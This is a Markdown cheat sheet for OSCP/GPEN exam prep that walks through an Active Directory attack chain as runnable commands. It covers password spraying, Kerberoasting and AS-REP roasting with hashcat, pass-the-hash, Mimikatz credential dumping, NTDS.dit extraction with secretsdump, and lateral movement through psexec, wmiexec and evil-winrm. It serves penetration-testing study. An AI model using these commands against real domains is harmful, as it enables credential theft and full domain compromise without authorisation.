# Active Directory Attacks Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured workflow for attacking Active Directory environments** during **OSCP and GPEN exams**. The focus is on **enumeration, credential attacks, lateral movement, and privilege escalation** within a Windows domain.

Core methodology:

```
Initial Access → Domain Enumeration → Credential Attacks → Lateral Movement → Privilege Escalation → Domain Dominance
```

Active Directory attacks rely heavily on **enumeration and credential reuse**.

---

# 1. Identify Domain Information

Check current domain context.

```powershell
whoami
whoami /all
echo %USERDOMAIN%
```

PowerShell:

```powershell
Get-WmiObject Win32_ComputerSystem
```

Check domain controller:

```powershell
nltest /dsgetdc:<domain>
```

---

# 2. Domain User Enumeration

List domain users:

```powershell
net user /domain
```

PowerShell:

```powershell
Get-ADUser -Filter *
```

Using CrackMapExec:

```bash
crackmapexec smb TARGET -u user -p password --users
```

---

# 3. Domain Group Enumeration

List groups:

```powershell
net group /domain
```

Check administrators:

```powershell
net group "Domain Admins" /domain
```

PowerShell:

```powershell
Get-ADGroup -Filter *
```

---

# 4. Domain Computer Enumeration

List computers:

```powershell
net view /domain
```

PowerShell:

```powershell
Get-ADComputer -Filter *
```

---

# 5. Share Enumeration

List SMB shares:

```bash
smbclient -L //TARGET -U user
```

Anonymous access:

```bash
smbclient -L //TARGET -N
```

---

# 6. LDAP Enumeration

Query LDAP:

```bash
ldapsearch -x -h TARGET
```

Example:

```bash
ldapsearch -x -b "dc=domain,dc=local"
```

---

# 7. BloodHound Enumeration

Collect domain data:

```bash
SharpHound.exe -c All
```

Upload results to BloodHound.

Analyze attack paths such as:

```
ACL abuse
privilege escalation
domain admin path
```

---

# 8. Password Spraying

Test one password across many users.

Using CrackMapExec:

```bash
crackmapexec smb TARGET -u users.txt -p Password123
```

Using Kerbrute:

```bash
kerbrute passwordspray users.txt password -d domain.local
```

---

# 9. Kerberoasting

Extract service account tickets.

Using Impacket:

```bash
GetUserSPNs.py domain/user:password -dc-ip TARGET
```

Output example:

```
$krb5tgs$23$...
```

Crack with Hashcat:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

---

# 10. AS-REP Roasting

Find users without Kerberos preauthentication.

Using Impacket:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip TARGET
```

Crack hashes:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

# 11. Pass-the-Hash

Use NTLM hash instead of password.

Example with CrackMapExec:

```bash
crackmapexec smb TARGET -u administrator -H HASH
```

Using Impacket:

```bash
psexec.py administrator@TARGET -hashes LMHASH:NTHASH
```

---

# 12. Pass-the-Ticket

Use Kerberos tickets.

Inject ticket:

```powershell
Rubeus ptt ticket.kirbi
```

---

# 13. Dumping Credentials

Using Mimikatz:

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Extract credentials from memory.

---

# 14. NTDS.dit Dumping

Dump domain password database.

Using Impacket:

```bash
secretsdump.py domain/user:password@DC_IP
```

Extract:

```
NTLM hashes
Kerberos keys
```

---

# 15. Lateral Movement

Common lateral movement methods:

```
SMB
WinRM
WMI
PsExec
RDP
```

---

# 16. PsExec Execution

Using Impacket:

```bash
psexec.py domain/user:password@TARGET
```

Provides SYSTEM shell.

---

# 17. WMI Execution

Execute commands remotely:

```bash
wmiexec.py domain/user:password@TARGET
```

---

# 18. SMBExec

Execute commands via SMB.

```bash
smbexec.py domain/user:password@TARGET
```

---

# 19. WinRM Access

Check WinRM:

```bash
crackmapexec winrm TARGET -u user -p password
```

Connect:

```bash
evil-winrm -i TARGET -u user -p password
```

---

# 20. RDP Access

Check RDP:

```bash
nmap -p3389 TARGET
```

Connect:

```bash
xfreerdp /u:user /p:password /v:TARGET
```

---

# 21. Administrator Session Enumeration

Check where admins are logged in.

Using CrackMapExec:

```bash
crackmapexec smb TARGET --sessions
```

---

# 22. Domain Trust Enumeration

Check domain trusts.

```powershell
nltest /domain_trusts
```

PowerShell:

```powershell
Get-ADTrust
```

---

# 23. ACL Abuse

Find misconfigured ACLs allowing privilege escalation.

Example:

```
GenericAll
WriteOwner
WriteDACL
```

BloodHound reveals these relationships.

---

# 24. Golden Ticket Attack

Requires:

```
krbtgt hash
domain SID
```

Generate ticket using Mimikatz.

---

# 25. Silver Ticket Attack

Create service-specific ticket.

Used for:

```
SMB
HTTP
CIFS
```

---

# 26. GPO Enumeration

Check Group Policy Objects.

```powershell
Get-GPO -All
```

Look for misconfigurations.

---

# 27. Domain Password Policy

Check policy:

```powershell
net accounts /domain
```

Look for:

```
minimum password length
lockout threshold
```

---

# 28. Important AD Attack Tools

Key tools:

```
Impacket
CrackMapExec
BloodHound
SharpHound
Mimikatz
Kerbrute
Rubeus
Evil-WinRM
```

---

# 29. AD Attack Workflow

Typical attack chain:

```
1. Enumerate domain
2. Identify users
3. Perform password spraying
4. Extract Kerberos tickets
5. Crack hashes
6. Move laterally
7. Dump credentials
8. Escalate to domain admin
```

---

# 30. Common AD Exam Vulnerabilities

Typical vulnerabilities:

```
Weak passwords
Kerberoasting
AS-REP roasting
Credential reuse
Exposed SMB shares
Misconfigured ACLs
```

---

# 31. Quick AD Attack Commands

Enumerate users:

```powershell
net user /domain
```

Kerberoasting:

```bash
GetUserSPNs.py domain/user:password
```

Password spray:

```bash
crackmapexec smb TARGET -u users.txt -p password
```

Dump hashes:

```bash
secretsdump.py domain/user:password@DC
```

---

# 32. Final Advice

Active Directory attacks depend heavily on **credential reuse and privilege escalation paths**.

Always ask:

```
Which credentials do I have?
Where are administrators logged in?
What permissions can I abuse?
```

Careful enumeration often reveals **direct paths to domain administrator access**.
